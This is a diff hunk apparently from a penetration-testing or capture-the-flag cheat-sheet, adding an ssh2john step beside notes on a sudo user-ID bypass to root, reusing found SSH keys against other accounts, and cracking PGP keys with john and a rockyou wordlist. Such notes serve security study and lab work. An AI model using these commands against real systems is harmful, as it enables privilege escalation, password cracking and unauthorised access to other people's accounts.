@@ -90,6 +90,8 @@ sudo -u#-1 /bin/bash
 look for keys and try to login with them to other users
 ssh {user}@{ip} -i {keyfile}
 
+ssh2john {keyfile}>hash
+
 #### pgp key decryption
 gpg2john {file}.asc > hash
 john --format=gpg --wordlist=/usr/share/wordlist/rockyou.txt hash
